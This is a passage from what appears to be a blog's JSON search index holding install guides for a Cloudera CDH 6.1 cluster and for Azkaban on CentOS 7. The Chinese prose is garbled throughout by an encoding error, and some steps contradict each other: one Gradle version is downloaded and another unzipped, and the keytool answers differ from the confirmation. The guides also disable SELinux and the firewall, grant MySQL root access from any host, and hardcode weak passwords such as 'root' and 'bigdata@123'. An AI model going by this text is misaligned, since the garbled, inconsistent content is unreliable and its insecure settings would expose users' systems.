dfsadmin -safemode leave\n","slug":"CDHæ„å»ºå¤§æ•°æ®å¹³å°-ä½¿ç”¨è‡ªå»ºçš„é•œåƒåœ°å€å®‰è£…Cloudera Manager","date":"2020-10-23T04:53:03.000Z","categories_index":"å¤§æ•°æ®","tags_index":"Hadoop,Cloudera,å¤§æ•°æ®","author_index":"Moses"},{"id":"6b3a3497e1eeebd4a65d0ba4c26e41db","title":"æ‰‹åŠ¨å®‰è£…CDH6.1","content":"æ‰‹å·¥å®‰è£…ä»“åº“# å®˜æ–¹Parcelsä»“åº“ï¼š \n# https:&#x2F;&#x2F;archive.cloudera.com&#x2F;cdh6&#x2F;6.1.0&#x2F;parcels&#x2F;\n#\n# Cloudera-Mangerä»“åº“ï¼š\n# https:&#x2F;&#x2F;archive.cloudera.com&#x2F;cm6&#x2F;6.1.0&#x2F;redhat7&#x2F;yum&#x2F;\n#\n# å†…ç½‘ä»“åº“ï¼š\n# http:&#x2F;&#x2F;172.24.26.90:57777&#x2F;cdh&#x2F;6.1.0&#x2F;\n# http:&#x2F;&#x2F;172.24.26.90:57777&#x2F;cloudera-manager&#x2F;6.1.0&#x2F;\n\n# éœ€è¦æ³¨æ„ï¼Œæ— è®ºä½¿ç”¨å†…ç½‘å’Œå®˜æ–¹ä»“åº“æ³¨å†Œéƒ½è¦ä½¿ç”¨æ‰§è¡Œï¼Œrpmå‘½ä»¤æ³¨å†Œä»“åº“\n\nrpm --import https:&#x2F;&#x2F;archive.cloudera.com&#x2F;cm6&#x2F;6.1.0&#x2F;redhat7&#x2F;yum&#x2F;RPM-GPG-KEY-cloudera\n\nrpm --import https:&#x2F;&#x2F;archive.cloudera.com&#x2F;cm6&#x2F;6.1.0&#x2F;redhat7&#x2F;yum&#x2F;RPM-GPG-KEY-cloudera\n\n\nå®‰è£…å®‰è£…ä¸‰èŠ‚ç‚¹é›†ç¾¤ã€‚\n\n\n\nä¸»æœºå\nRole\nå¤‡æ³¨\n\n\n\nrjbdnode1\ncmã€mariadbã€agent\n172.24.26.102\n\n\nrjbdnode2\nagent\n172.24.26.103\n\n\nrjbdnode3\nagent\n172.24.26.104\n\n\nå‰æœŸå·¥ä½œ(æ‰€æœ‰èŠ‚ç‚¹)# å…³é˜²ç«å¢™\nsetenforce 0\nsystemctl stop firewalld\nsystemctl disable firewalld\n\n# è£…JDK\n\nå®‰è£…MariaDByum -y install mariadb-server\nsystemctl enable mariadb\nsystemctl start mariadb\n\n# æ‰§è¡Œ &#x2F;usr&#x2F;bin&#x2F;mysql_secure_installation åˆå§‹åŒ–åŒ–æ•°æ®åº“\n\n# æ‰§è¡Œä»¥ä¸‹sqlå…è®¸rootç”¨æˆ·è¿œç¨‹è®¿é—®\n# GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;rjbigdata&#39; WITH GRANT OPTION;\n\n# æ‰§è¡Œä»¥ä¸‹SQLåˆ›å»ºDB\n# CREATE DATABASE scm DEFAULT CHARACTER SET utf8 DEFAULT COLLATE utf8_general_ci;\n\næ³¨æ„ï¼šCloudera ç»™å‡ºäº†ä¸€ä¸ªMariaDBçš„å®˜æ–¹æ¨èé…ç½®ï¼Œè¯·å‚è€ƒã€‚\nå®‰è£…Clouderaåº”ç”¨# æ‰€æœ‰èŠ‚ç‚¹å®‰è£…mysqlçš„JDBCé©±åŠ¨ï¼Œæ‰§è¡Œä»¥ä¸‹ä»£ç \n\nwget https:&#x2F;&#x2F;dev.mysql.com&#x2F;get&#x2F;Downloads&#x2F;Connector-J&#x2F;mysql-connector-java-5.1.47.tar.gz\ntar zxvf mysql-connector-java-5.1.47.tar.gz\nmkdir -p &#x2F;usr&#x2F;share&#x2F;java&#x2F;\ncd mysql-connector-java-5.1.47\ncp mysql-connector-java-5.1.47-bin.jar &#x2F;usr&#x2F;share&#x2F;java&#x2F;mysql-connector-java.jar\n\n# å®‰è£…rjbdnode1 æ‰§è¡Œ\nyum install -y  cloudera-manager-server\n# åœ¨rjbdnode1 åŒæ­¥æ•°æ®åº“é…ç½®\n&#x2F;opt&#x2F;cloudera&#x2F;cm&#x2F;schema&#x2F;scm_prepare_database.sh mysql -h rjbdnode1 --scm-host rjbdnode1 scm root rjbigdata\n# å¯åŠ¨CM\nsystemctl enable cloudera-scm-server\nsystemctl start cloudera-scm-server\n\n# æ‰€æœ‰èŠ‚ç‚¹æ‰§è¡Œä»¥ä¸‹æ“ä½œ\nyum install -y  cloudera-manager-agent\n# ä¿®æ”¹ &#x2F;etc&#x2F;cloudera-scm-agent&#x2F;config.ini ä¸­çš„ server_host ä¸º rjbdnode1\n\n# å¯åŠ¨AGENT\nsystemctl enable cloudera-scm-agent\nsystemctl start cloudera-scm-agent\n\nåˆ›å»ºé›†ç¾¤ç™»å½•CMåˆ›å»ºé›†ç¾¤ï¼Œç•¥ã€‚\n","slug":"æ‰‹åŠ¨å®‰è£…CDH6.1.md","date":"2020-10-20T09:53:00.000Z","categories_index":"å¤§æ•°æ®","tags_index":"Hadoop,Cloudera,å¤§æ•°æ®","author_index":"Moses"},{"id":"f6f3c3a5d4505ac58f98c7a3b8694668","title":"azkabanå®‰è£…","content":"Centos7å®‰è£…AzkabanCentos7å®‰è£…Gradle1.ä¸‹è½½Gradleå®‰è£…åŒ…\nwget https:&#x2F;&#x2F;downloads.gradle.org&#x2F;distributions&#x2F;gradle-3.2.1-all.zip\n2.æ–°å»ºç‰ˆæœ¬ç›®å½•å¹¶è§£å‹å®‰è£…\nmkdir &#x2F;opt&#x2F;gradle\nunzip -d &#x2F;opt&#x2F;gradle gradle-4.10.3-all.zip\n3.é…ç½®ç¯å¢ƒå˜é‡\nvi ~&#x2F;.bash_profile\nexport PATH&#x3D;$PATH:&#x2F;opt&#x2F;gradle&#x2F;gradle-4.10.3&#x2F;bin\nsource ~&#x2F;.bash_profile\ngradle -v\n4.é…ç½®å…¨å±€å˜é‡æ›¿æ¢æº\nvi ~&#x2F;.gradle&#x2F;init.gradle\nallprojects&#123;\n    repositories &#123;\n        def ALIYUN_REPOSITORY_URL &#x3D; &#39;https:&#x2F;&#x2F;maven.aliyun.com&#x2F;repository&#x2F;public&#x2F;&#39;\n        def ALIYUN_JCENTER_URL &#x3D; &#39;https:&#x2F;&#x2F;maven.aliyun.com&#x2F;repository&#x2F;jcenter&#x2F;&#39;\n        def ALIYUN_GOOGLE_URL &#x3D; &#39;https:&#x2F;&#x2F;maven.aliyun.com&#x2F;repository&#x2F;google&#x2F;&#39;\n        def ALIYUN_GRADLE_PLUGIN_URL &#x3D; &#39;https:&#x2F;&#x2F;maven.aliyun.com&#x2F;repository&#x2F;gradle-plugin&#x2F;&#39;\n        all &#123; ArtifactRepository repo -&gt;\n            if(repo instanceof MavenArtifactRepository)&#123;\n                def url &#x3D; repo.url.toString()\n                if (url.startsWith(&#39;https:&#x2F;&#x2F;repo1.maven.org&#x2F;maven2&#x2F;&#39;)) &#123;\n                    project.logger.lifecycle &quot;Repository $&#123;repo.url&#125; replaced by $ALIYUN_REPOSITORY_URL.&quot;\n                    remove repo\n                &#125;\n                if (url.startsWith(&#39;https:&#x2F;&#x2F;jcenter.bintray.com&#x2F;&#39;)) &#123;\n                    project.logger.lifecycle &quot;Repository $&#123;repo.url&#125; replaced by $ALIYUN_JCENTER_URL.&quot;\n                    remove repo\n                &#125;\n                if (url.startsWith(&#39;https:&#x2F;&#x2F;dl.google.com&#x2F;dl&#x2F;android&#x2F;maven2&#x2F;&#39;)) &#123;\n                    project.logger.lifecycle &quot;Repository $&#123;repo.url&#125; replaced by $ALIYUN_GOOGLE_URL.&quot;\n                    remove repo\n                &#125;\n                if (url.startsWith(&#39;https:&#x2F;&#x2F;plugins.gradle.org&#x2F;m2&#x2F;&#39;)) &#123;\n                    project.logger.lifecycle &quot;Repository $&#123;repo.url&#125; replaced by $ALIYUN_GRADLE_PLUGIN_URL.&quot;\n                    remove repo\n                &#125;\n            &#125;\n        &#125;\n        maven &#123; url ALIYUN_REPOSITORY_URL &#125;\n        maven &#123; url ALIYUN_JCENTER_URL &#125;\n        maven &#123; url ALIYUN_GOOGLE_URL &#125;\n        maven &#123; url ALIYUN_GRADLE_PLUGIN_URL &#125;\n    &#125;\n&#125;\n5.gradlewå’Œgradleå‘½ä»¤çš„åŒºåˆ«Gradlewæ˜¯åŒ…è£…å™¨ï¼Œè‡ªåŠ¨ä¸‹è½½åŒ…è£…å™¨é‡Œå®šä¹‰å¥½çš„gradle ç‰ˆæœ¬ï¼Œä¿è¯ç¼–è¯‘ç¯å¢ƒç»Ÿä¸€ï¼Œgradle æ˜¯ç”¨æœ¬åœ°çš„gradleç‰ˆæœ¬ã€‚Wrapper (gradlew)\nå®‰è£…AzkanbanAZkanbanå‰æœŸçŸ¥è¯†å‡†å¤‡1.ä»‹ç»\nAzkabanæ˜¯ç”±Linkedinå…¬å¸æ¨å‡ºçš„ä¸€ä¸ªæ‰¹é‡å·¥ä½œæµä»»åŠ¡è°ƒåº¦å™¨ï¼Œä¸»è¦ç”¨äºåœ¨ä¸€ä¸ªå·¥ä½œæµå†…ä»¥ä¸€ä¸ªç‰¹å®šçš„é¡ºåºè¿è¡Œä¸€ç»„å·¥ä½œå’Œæµç¨‹ï¼Œå®ƒçš„é…ç½®æ˜¯é€šè¿‡ç®€å•çš„key:valueå¯¹çš„æ–¹å¼ï¼Œé€šè¿‡é…ç½®ä¸­çš„dependencies æ¥è®¾ç½®ä¾èµ–å…³ç³»(ä¾èµ–å¿…é¡»æ˜¯ä¸€ä¸ªDAG)ã€‚\nAzkabanä½¿ç”¨jobé…ç½®æ–‡ä»¶å»ºç«‹ä»»åŠ¡ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œå¹¶æä¾›ä¸€ä¸ªæ˜“äºä½¿ç”¨çš„webç”¨æˆ·ç•Œé¢ç»´æŠ¤å’Œè·Ÿè¸ªä½ çš„å·¥ä½œæµã€‚\nAzkabanå®˜ç½‘ï¼šhttps:&#x2F;&#x2F;azkaban.github.io&#x2F;\n2.Azkanbançš„ç‰¹ç‚¹\n1.åŠŸèƒ½å¼ºå¤§ï¼Œå¯ä»¥è°ƒåº¦å‡ ä¹æ‰€æœ‰è½¯ä»¶çš„æ‰§è¡Œï¼Œæä¾›æ¨¡å—åŒ–å’Œå¯æ’æ‹”çš„æ’ä»¶æœºåˆ¶ï¼ŒåŸç”Ÿæ”¯æŒcommandã€Javaã€Hiveã€Pigã€Hadoopï¼›\n2.åŸºäºJavaå¼€å‘ï¼Œä»£ç ç»“æ„æ¸…æ™°ï¼Œæ˜“äºäºŒæ¬¡å¼€å‘ï¼›\n3.ç®€å•æ˜“ç”¨çš„Webç”¨æˆ·ç•Œé¢ï¼Œå¯ä»¥ç›‘æ§æ¯ä¸€ä¸ªæ­¥éª¤ï¼›\n4.æä¾›jobé…ç½®æ–‡ä»¶å¿«é€Ÿå»ºç«‹ä»»åŠ¡å’Œä»»åŠ¡ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼›\n5.æä¾›äº†Restfulæ¥å£ï¼Œæ–¹ä¾¿æˆ‘ä»¬å¹³å°è¿›è¡Œå®šåˆ¶åŒ–è°ƒç”¨ã€‚\n3.Azkabançš„æ¶æ„\nAzkabanç”±ä¸‰ä¸ªå…³é”®ç»„ä»¶æ„æˆï¼š\n  1.å…³ç³»å‹æ•°æ®åº“ï¼ˆMySQLï¼‰:ç”¨äºä¿å­˜å·¥ä½œæµç›¸å…³ä¿¡æ¯ï¼›\n  2.AzkabanWebServer: æ•´ä¸ª Azkaban å·¥ä½œæµç³»ç»Ÿçš„ä¸»è¦ç®¡ç†è€…ï¼Œå®ƒç”¨äºç”¨æˆ·ç™»å½•è®¤è¯ã€è´Ÿè´£ project ç®¡ç†ã€å®šæ—¶æ‰§è¡Œå·¥ä½œæµã€è·Ÿè¸ªå·¥ä½œæµæ‰§è¡Œè¿›åº¦ç­‰ä¸€ç³»åˆ—ä»»åŠ¡ï¼›\n  3.AzkabanExecutorServer: è´Ÿè´£å…·ä½“çš„å·¥ä½œæµçš„è°ƒåº¦æäº¤ã€‚\n4.Azkabançš„ä¸‰å¤§æ¨¡å—\nazkabanæœ‰ä¸‰å¤§æ¨¡å—,azkaban-common,azkaban-exec-server,azkaban-web-server.\n  azkaban-commonï¼šæ˜¯å…¬å…±æ¨¡å—,æ¯”å¦‚è®¿é—®æ•°æ®åº“,triggerç®¡ç†å·¥å…·,é‚®ä»¶å·¥å…·,ä»¥åŠjob.\n  azkaban-exec-serverï¼šæ˜¯æ‰§è¡Œå™¨,ä¸»è¦ç”¨äºæ‰§è¡Œä»»åŠ¡\n  azkaban-web-serverï¼šæ˜¯è°ƒåº¦ä¸­å¿ƒ,ç”¨äºä»»åŠ¡å±•ç¤ºã€ç¼–è¾‘,è°ƒåº¦ä»»åŠ¡\n5.éƒ¨ç½²æ¨¡å¼\nsolo-serveræ¨¡å¼:\nDBä½¿ç”¨çš„æ˜¯ä¸€ä¸ªå†…åµŒçš„H2ï¼ŒWeb Serverå’ŒExecutor Serverè¿è¡Œåœ¨åŒä¸€ä¸ªè¿›ç¨‹é‡Œã€‚è¿™ç§æ¨¡å¼åŒ…å«Azkabançš„æ‰€æœ‰ç‰¹æ€§ï¼Œä½†ä¸€èˆ¬ç”¨æ¥å­¦ä¹ å’Œæµ‹è¯•ã€‚\n\ntwo-serveræ¨¡å¼:\nDBä½¿ç”¨çš„æ˜¯MySQLï¼ŒMySQLæ”¯æŒmaster-slaveæ¶æ„ï¼ŒWeb Serverå’ŒExecutor Serverè¿è¡Œåœ¨ä¸åŒçš„è¿›ç¨‹ä¸­ã€‚\n\nåˆ†å¸ƒå¼multiple-executoræ¨¡å¼:\nDBä½¿ç”¨çš„æ˜¯MySQLï¼ŒMySQLæ”¯æŒmaster-slaveæ¶æ„ï¼ŒWeb Serverå’ŒExecutor Serverè¿è¡Œåœ¨ä¸åŒæœºå™¨ä¸Šï¼Œä¸”æœ‰å¤šä¸ªExecutor Serverã€‚\nç¼–è¯‘å®‰è£…1.ç¼–è¯‘\ngit clone https:&#x2F;&#x2F;github.com&#x2F;azkaban&#x2F;azkaban.git [[clone]] the repo\ncd azkaban; sh .&#x2F;gradlew build  [[build]] &amp; install package\n.&#x2F;gradlew clean \n.&#x2F;gradlew installDist\n.&#x2F;gradlew test\n.&#x2F;gradlew build -x test\n\ncd azkaban-solo-server&#x2F;build&#x2F;install&#x2F;azkaban-solo-server; bin&#x2F;start-solo.sh [[start]] solo server \nbin&#x2F;shutdown-solo.sh  [[stop]] \n2.ä½¿ç”¨ç¼–è¯‘å¥½çš„æ–‡ä»¶è¿›è¡Œå®‰è£…èŠ‚ç‚¹å‡†å¤‡ï¼š   \n\nweb-serveï¼š172.16.3.109  \nexecutor-serverï¼š172.16.3.179  \nDB-serverï¼š172.16.3.123ç¼–è¯‘åæ–‡ä»¶ä¸Šä¼ å¹¶è§£å‹ï¼šazkaban-web-server    mkdir opt&#x2F;azkaban\ncd azkaban\ntar -zxvf azkaban-web-server-0.1.0-SNAPSHOT.tar.gz\ntar -zxvf azkaban-db-0.1.0-SNAPSHOT.tar.gz\nmv azkaban-db-0.1.0-SNAPSHOT azkaban-db\nmv azkaban-web-server-0.1.0-SNAPSHOT azkaban-web-server\nexcutor-server      mkdir azkaban\ncd azkaban\ntar -zxvf azkaban-exec-server-0.1.0-SNAPSHOT.tar.gz\nmv azkaban-exec-server-0.1.0-SNAPSHOT azkaban-exec-server\nDB-server   mysql&gt; CREATE DATABASE azkaban;\nmysql&gt; use azkaban;\nmysql&gt; source &#x2F;opt&#x2F;azkaban&#x2F;azkaban-db&#x2F;create-all-sql-0.1.0-SNAPSHOT.sql; [[å·¥å…·å¯¼å…¥å¤±è´¥å»ºè®®ä½¿ç”¨SQL]]è¯­å¥å¯¼å…¥\ninsert into executors(host,port,active) values(&#39;172.16.3.179&#39;,12331,1);\n3.Executorç«¯Serverå®‰è£…[root@kdc conf]# cat azkaban.properties\n# Azkaban Personalization Settings\nazkaban.name&#x3D;Test\nazkaban.label&#x3D;My Local Azkaban\nazkaban.color&#x3D;[[FF3601]]\nazkaban.default.servlet.path&#x3D;&#x2F;index\nweb.resource.dir&#x3D;web&#x2F;\ndefault.timezone.id&#x3D;America&#x2F;Los_Angeles\n# Azkaban UserManager class\nuser.manager.class&#x3D;azkaban.user.XmlUserManager\nuser.manager.xml.file&#x3D;conf&#x2F;azkaban-users.xml\n# Loader for projects\nexecutor.global.properties&#x3D;conf&#x2F;global.properties\nazkaban.project.dir&#x3D;projects\n# Velocity dev mode\nvelocity.dev.mode&#x3D;false\n# Azkaban Jetty server properties.\njetty.use.ssl&#x3D;false\njetty.maxThreads&#x3D;25\njetty.port&#x3D;8081\n# Where the Azkaban web server is located\nazkaban.webserver.url&#x3D;http:&#x2F;&#x2F;172.16.3.109:8081\n# mail settings\nmail.sender&#x3D;\nmail.host&#x3D;\n# User facing web server configurations used to construct the user facing server URLs. They are useful when there is a reverse proxy between Azkaban web servers and users.\n# enduser -&gt; myazkabanhost:443 -&gt; proxy -&gt; localhost:8081\n# when this parameters set then these parameters are used to generate email links.\n# if these parameters are not set then jetty.hostname, and jetty.port(if ssl configured jetty.ssl.port) are used.\n# azkaban.webserver.external_hostname&#x3D;myazkabanhost.com\n# azkaban.webserver.external_ssl_port&#x3D;443\n# azkaban.webserver.external_port&#x3D;8081\njob.failure.email&#x3D;\njob.success.email&#x3D;\nlockdown.create.projects&#x3D;false\ncache.directory&#x3D;cache\n# JMX stats\njetty.connector.stats&#x3D;true\nexecutor.connector.stats&#x3D;true\n# Azkaban plugin settings\nazkaban.jobtype.plugin.dir&#x3D;plugins&#x2F;jobtypes\n# Azkaban mysql settings by default. Users should configure their own username and password.\ndatabase.type&#x3D;mysql\nmysql.port&#x3D;3306\nmysql.host&#x3D;172.16.3.123\nmysql.database&#x3D;azkabab\nmysql.user&#x3D;root\nmysql.password&#x3D;root\nmysql.numconnections&#x3D;100\n# Azkaban Executor settings\nexecutor.maxThreads&#x3D;50\nexecutor.flow.threads&#x3D;30\nexecutor.port&#x3D;12331\nexecutor.connector.stats&#x3D;true\nexecutor.maxThreads&#x3D;50\nexecutor.flow.threads&#x3D;30\nexecution.logs.retention.ms&#x3D;2419200000\n4.å¯åŠ¨executoræœåŠ¡æ³¨æ„ï¼šå¯åŠ¨é¡ºåºä¸€å®šæ˜¯å…ˆå¯åŠ¨azkaban-exec-serverï¼Œå†å¯åŠ¨azkaban-web-server.&#x2F;bin&#x2F;start-web.sh [[ä¸€å®šè¦åœ¨bin]]æ–‡ä»¶çš„ä¸Šä¸€å±‚ç›®å½•è¿›è¡Œå¯åŠ¨\ntail -f executorServerLog_*.out #æŸ¥çœ‹å¯åŠ¨æ—¥å¿—\njps #æŸ¥çœ‹è¿›ç¨‹\ncurl -G &quot;localhost:12331&#x2F;executor?action&#x3D;activate&quot; &amp;&amp; echo [[æ‰‹åŠ¨æ¿€æ´»executor]]\n5.Webç«¯Serverå®‰è£… [[é…ç½®azkaban]].propertiesæ–‡ä»¶\ncat azkaban.properties\n# Azkaban Personalization Settings\nazkaban.name&#x3D;Test\nazkaban.label&#x3D;My Local Azkaban\nazkaban.color&#x3D;[[FF3601]]\nazkaban.default.servlet.path&#x3D;&#x2F;index\nweb.resource.dir&#x3D;web&#x2F;\ndefault.timezone.id&#x3D;America&#x2F;Los_Angeles\n# Azkaban UserManager class\nuser.manager.class&#x3D;azkaban.user.XmlUserManager\nuser.manager.xml.file&#x3D;conf&#x2F;azkaban-users.xml\n# Loader for projects\nexecutor.global.properties&#x3D;conf&#x2F;global.properties\nazkaban.project.dir&#x3D;projects\n# Velocity dev mode\nvelocity.dev.mode&#x3D;false\n# Azkaban Jetty server properties.\njetty.use.ssl&#x3D;false\njetty.maxThreads&#x3D;25\njetty.port&#x3D;8081\n# Azkaban Executor settings\n# mail settings\nmail.sender&#x3D;\nmail.host&#x3D;\n# User facing web server configurations used to construct the user facing server URLs. They are useful when there is a reverse proxy between Azkaban web servers and users.\n# enduser -&gt; myazkabanhost:443 -&gt; proxy -&gt; localhost:8081\n# when this parameters set then these parameters are used to generate email links.\n# if these parameters are not set then jetty.hostname, and jetty.port(if ssl configured jetty.ssl.port) are used.\n# azkaban.webserver.external_hostname&#x3D;myazkabanhost.com\n# azkaban.webserver.external_ssl_port&#x3D;443\n# azkaban.webserver.external_port&#x3D;8081\njob.failure.email&#x3D;\njob.success.email&#x3D;\nlockdown.create.projects&#x3D;false\ncache.directory&#x3D;cache\n# JMX stats\njetty.connector.stats&#x3D;true\nexecutor.connector.stats&#x3D;true\n# Azkaban mysql settings by default. Users should configure their own username and password.\ndatabase.type&#x3D;mysql\nmysql.port&#x3D;3306\nmysql.host&#x3D;172.16.3.123\nmysql.database&#x3D;azkaban\nmysql.user&#x3D;root\nmysql.password&#x3D;root\nmysql.numconnections&#x3D;100\n[[Multiple]] Executor\nazkaban.use.multiple.executors&#x3D;true\nazkaban.executorselector.filters&#x3D;StaticRemainingFlowSize,MinimumFreeMemory,CpuStatus\nazkaban.executorselector.comparator.NumberOfAssignedFlowComparator&#x3D;1\nazkaban.executorselector.comparator.Memory&#x3D;1\nazkaban.executorselector.comparator.LastDispatched&#x3D;1\nazkaban.executorselector.comparator.CpuUsage&#x3D;1\nå¯åŠ¨webæœåŠ¡æ³¨æ„ï¼šå¯åŠ¨é¡ºåºä¸€å®šæ˜¯å…ˆå¯åŠ¨azkaban-exec-serverï¼Œå†å¯åŠ¨azkaban-web-server.&#x2F;bin&#x2F;start-web.sh [[ä¸€å®šè¦åœ¨bin]]æ–‡ä»¶çš„ä¸Šä¸€å±‚ç›®å½•è¿›è¡Œå¯åŠ¨\ntail -f executorServerLog_*.out #æŸ¥çœ‹å¯åŠ¨æ—¥å¿—\njps #æŸ¥çœ‹è¿›ç¨‹\né…ç½®jetty ssl  # keytool -keystore keystore -alias jetty -genkey -keyalg RSA\n \nEnter keystore password:\n \nRe-enter new password:\n \nWhat is your first and last name?\n \n[Unknown]: YY\n \nWhat is the name of your organizational unit?\n \n[Unknown]: YY\n \nWhat is the name of your organization?\n \n[Unknown]: YY\n \nWhat is the name of your City or Locality?\n \n[Unknown]: Beijing\n \nWhat is the name of your State or Province?\n \n[Unknown]: Beijing\n \nWhat is the two-letter country code for this unit?\n \n[Unknown]: CN\n \nIs CN&#x3D;YY, OU&#x3D;YY, O&#x3D;YY, L&#x3D;shanghai, ST&#x3D;shanghai, C&#x3D;CN correct?\n \n[no]: y\nå°†ç”Ÿæˆçš„keystoneæ–‡ä»¶æ‹·è´åˆ°web-serverçš„å®‰è£…ç›®å½•ä¸‹ï¼Œå’Œconfç­‰ç›®å½•åŒçº§ä¿®æ”¹conf&#x2F;azkaban.propertiesé…ç½®æ–‡ä»¶  [[cat]] azkaban.properties\n \n# Azkaban Personalization Settings\n \nazkaban.name&#x3D;Test [[æœåŠ¡å™¨UI]]åç§°ï¼Œç”¨äºæœåŠ¡å™¨ä¸Šæ–¹æ˜¾ç¤ºçš„åå­—\n \nazkaban.label&#x3D;My Local Azkaban #æè¿°\n \nazkaban.color&#x3D;[[FF3601]] [[UI]]é¢œè‰²\n \nazkaban.default.servlet.path&#x3D;&#x2F;index\n \nweb.resource.dir&#x3D;web&#x2F; [[é»˜è®¤æ ¹web]]ç›®å½•\n \ndefault.timezone.id&#x3D;Asia&#x2F;Shanghai #é»˜è®¤æ—¶åŒºï¼Œå·²æ”¹ä¸ºäºšæ´²&#x2F;ä¸Šæµ·\n \n# Azkaban UserManager class\n \nuser.manager.class&#x3D;azkaban.user.XmlUserManager #ç”¨æˆ·æƒé™ç®¡ç†é»˜è®¤ç±»\n \nuser.manager.xml.file&#x3D;conf&#x2F;azkaban-users.xml #ç”¨æˆ·é…ç½®ï¼Œå…·ä½“é…ç½®å‚è§ä¸‹æ–‡\n \n# Loader for projects\n \nexecutor.global.properties&#x3D;conf&#x2F;global.properties [[globa]]é…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®\n \nazkaban.project.dir&#x3D;projects\n \n \n \n# Velocity dev mode\n \nvelocity.dev.mode&#x3D;false\n \n# Azkaban Jetty server properties. [[jetty]]æœåŠ¡å™¨å±æ€§\n \njetty.maxThreads&#x3D;25 #æœ€å¤§çº¿ç¨‹æ•°\n \njetty.ssl.port&#x3D;8443 [[jetty]] sslç«¯å£å·\n \njetty.port&#x3D;8081 [[jetty]]ç«¯å£\n \njetty.keystore&#x3D;keystore [[SSL]]æ–‡ä»¶å\n \njetty.password&#x3D;bigdata@123 [[SSL]]æ–‡ä»¶å¯†ç \n \njetty.keypassword&#x3D;bigdata@123 [[jettyä¸»å¯†ç ä¸keystore]]æ–‡ä»¶ç›¸åŒ\n \njetty.truststore&#x3D;keystore [[SSL]]æ–‡ä»¶å\n \njetty.trustpassword&#x3D;bigdata@123 [[SSL]]æ–‡ä»¶å¯†ç \n \n# Azkaban Executor settings\n \nexecutor.port&#x3D;12321 #æ‰§è¡ŒæœåŠ¡å™¨ç«¯å£\n \n# mail settings #é‚®ä»¶é…ç½®ï¼ˆæš‚æ²¡æœ‰é…ç½®ï¼‰\n \nmail.sender&#x3D; #å‘é€é‚®ç®±\n \nmail.host&#x3D; [[å‘é€é‚®ç®±smtp]]åœ°å€\n \nmail.password&#x3D; #é‚®ç®±å¯†ç \n \njob.failure.email&#x3D; #ä»»åŠ¡å¤±è´¥æ—¶å‘é€é‚®ä»¶çš„åœ°å€\n \njob.success.email&#x3D; #ä»»åŠ¡æˆåŠŸæ—¶å‘é€é‚®ä»¶çš„åœ°å€\n \nlockdown.create.projects&#x3D;false\n \ncache.directory&#x3D;cache #ç¼“å­˜ç›®å½•\n \n# JMX stats\n \njetty.connector.stats&#x3D;true\n \nexecutor.connector.stats&#x3D;true\n \n# Azkaban plugin settings\n \nazkaban.jobtype.plugin.dir&#x3D;plugins&#x2F;jobtypes\n \n \n \ndatabase.type&#x3D;mysql #æ•°æ®åº“ç±»å‹\n \nmysql.port&#x3D;3306 #æ•°æ®åº“ç«¯å£å·\n \nmysql.host&#x3D;172.31.217.173 #æ•°æ®åº“è¿æ¥åœ°å€\n \nmysql.database&#x3D;azkaban #æ•°æ®åº“å®ä¾‹å\n \nmysql.user&#x3D;azkaban #æ•°æ®åº“ç”¨æˆ·å\n \nmysql.password&#x3D;bigdata@123 #æ•°æ®åº“å¯†ç \n \nmysql.numconnections&#x3D;100 #æ•°æ®åº“æœ€å¤§è¿æ¥æ•°\n \nazkaban.use.multiple.executors&#x3D;true\n \nazkaban.executorselector.filters&#x3D;StaticRemainingFlowSize,MinimumFreeMemory,CpuStatus\n \nazkaban.executorselector.comparator.NumberOfAssignedFlowComparator&#x3D;1\n \nazkaban.executorselector.comparator.Memory&#x3D;1\n \nazkaban.executorselector.comparator.LastDispatched&#x3D;1\n \nazkaban.executorselector.comparator.CpuUsage&#x3D;1\n\n\nå‚è€ƒèµ„æ–™Azkaban docgithubé¡¹ç›®åœ°å€Azkaban3.Xï¼ˆå¯è§†åŒ–ä»»åŠ¡è°ƒåº¦å™¨ï¼‰å¤šèŠ‚ç‚¹é›†ç¾¤éƒ¨ç½²Azkabanå­¦ä¹ azkabançš„éƒ¨ç½²è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›å‘ï¼ˆéƒ¨ç½²ç¯‡)hadoopå­¦ä¹ ç¬”è®°7-AzkabanAzkabanä»»åŠ¡è°ƒåº¦æ¡†æ¶çš„ç¼–è¯‘ä¸å®‰è£…\n","slug":"Centos7å®‰è£…azkaban","date":"2020-08-23T04:53:03.000Z","categories_index":"å¤§æ•°æ®","tags_index":"å¤§æ•°æ®,åˆ†å¸ƒå¼ä»»åŠ¡è°ƒåº¦,Azkaban,å®‰è£…æ‰‹å†Œ","author_index":"Moses"}]